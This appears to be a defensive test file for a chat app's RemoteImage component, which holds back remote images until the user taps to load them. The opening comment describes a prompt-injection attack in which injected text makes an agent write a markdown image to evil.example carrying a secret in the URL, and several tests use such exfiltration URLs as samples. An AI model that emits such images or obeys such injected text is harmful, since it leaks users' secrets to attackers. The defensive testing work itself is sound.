/**
 * A remote image in a reply is fetched only when someone asks.
 *
 * The threat is prompt injection, not a hostile user: something the agent
 * read tells it to write `![](https://evil.example/?d=<secret>)`, and if the
 * phone loads every image it renders, the secret leaves the moment the reply
 * paints. So the line this pins is the one between "the browser makes a
 * request" and "it doesn't" — which origins count as remote, and that the
 * `<img>` (the request) does not exist until the button is pressed.
 */
import { afterEach, describe, expect, it, vi } from 'vitest';
import { cleanup, fireEvent, render, screen } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { RemoteImage, remoteImageHost } from '../src/components/chat/RemoteImage';

vi.mock('../src/store/session', () => ({
  useSession: (pick: (s: unknown) => unknown) => pick({ info: { cwd: '/code/app' } }),
}));

import { Markdown } from '../src/components/chat/Markdown';

afterEach(cleanup);

const PAGE = 'https://hem.tailnet.ts.net';

describe('remoteImageHost', () => {
  it('names the host of an image on another origin', () => {
    expect(remoteImageHost('https://evil.example/x.png?d=secret', PAGE)).toBe('evil.example');
    expect(remoteImageHost('http://evil.example:8080/x.png', PAGE)).toBe('evil.example:8080');
  });

  it('judges a protocol-relative source by where it would really go', () => {
    expect(remoteImageHost('//evil.example/x.png', PAGE)).toBe('evil.example');
  });

  it('treats another port or scheme on the same host as another origin', () => {
    expect(remoteImageHost('https://hem.tailnet.ts.net:8443/x.png', PAGE)).toBe(
      'hem.tailnet.ts.net:8443',
    );
    expect(remoteImageHost('http://hem.tailnet.ts.net/x.png', PAGE)).toBe('hem.tailnet.ts.net');
  });

  it('shows an IDN host as punycode, not as a lookalike', () => {
    // A Cyrillic 'а' in place of the Latin one.
    expect(remoteImageHost('https://ex\u0430mple.com/x.png', PAGE)).toBe('xn--exmple-4nf.com');
  });

  it('leaves same-origin and relative sources alone', () => {
    expect(remoteImageHost(`${PAGE}/assets/logo.png`, PAGE)).toBeNull();
    expect(remoteImageHost('/assets/logo.png', PAGE)).toBeNull();
    expect(remoteImageHost('logo.png', PAGE)).toBeNull();
  });

  it('leaves sources that make no network request alone', () => {
    expect(remoteImageHost('data:image/png;base64,AAAA', PAGE)).toBeNull();
    expect(remoteImageHost(`blob:${PAGE}/1234`, PAGE)).toBeNull();
    expect(remoteImageHost('file:///home/u/shot.png', PAGE)).toBeNull();
    expect(remoteImageHost('workspace://out/shot.png', PAGE)).toBeNull();
  });
});

describe('RemoteImage', () => {
  it('renders no <img> until tapped, then one that sends no referrer', () => {
    const src = 'https://evil.example/a.png?d=1';
    const { container } = render(<RemoteImage src={src} host="evil.example" alt="chart" />);

    expect(container.querySelector('img')).toBeNull();
    const button = screen.getByRole('button', { name: 'Load image from evil.example: chart' });
    expect(button).toHaveTextContent('Image from evil.example — tap to load');

    fireEvent.click(button);
    const img = screen.getByAltText('chart');
    expect(img).toHaveAttribute('src', src);
    expect(img).toHaveAttribute('referrerpolicy', 'no-referrer');
    expect(screen.queryByRole('button')).toBeNull();
  });

  it('remembers the exact URL it was allowed, and nothing else', () => {
    const src = 'https://evil.example/b.png';
    const first = render(<RemoteImage src={src} host="evil.example" />);
    fireEvent.click(screen.getByRole('button'));
    first.unmount();

    // A remount (the streaming bubble becoming the final message) keeps it…
    const again = render(<RemoteImage src={src} host="evil.example" />);
    expect(again.container.querySelector('img')).not.toBeNull();
    again.unmount();

    // …but another URL on the same host still has to ask.
    const other = render(<RemoteImage src={`${src}?d=secret`} host="evil.example" />);
    expect(other.container.querySelector('img')).toBeNull();
  });
});

describe('images in Markdown', () => {
  const md = (text: string) =>
    render(
      <MemoryRouter>
        <Markdown>{text}</Markdown>
      </MemoryRouter>,
    );

  it('holds back a remote image the model wrote', () => {
    const { container } = md('![](https://evil.example/p.png?d=hunter2)');
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('button', { name: 'Load image from evil.example' })).toBeInTheDocument();
  });

  it('renders a same-origin image straight away', () => {
    const { container } = md(`![logo](${window.location.origin}/icon.png)`);
    expect(container.querySelector('img')).toHaveAttribute('src', `${window.location.origin}/icon.png`);
  });

  it('keeps noopener noreferrer on a remote link', () => {
    md('[docs](https://example.com/docs)');
    const link = screen.getByRole('link', { name: 'docs' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link.getAttribute('rel')?.split(' ').sort()).toEqual(['noopener', 'noreferrer']);
  });
});
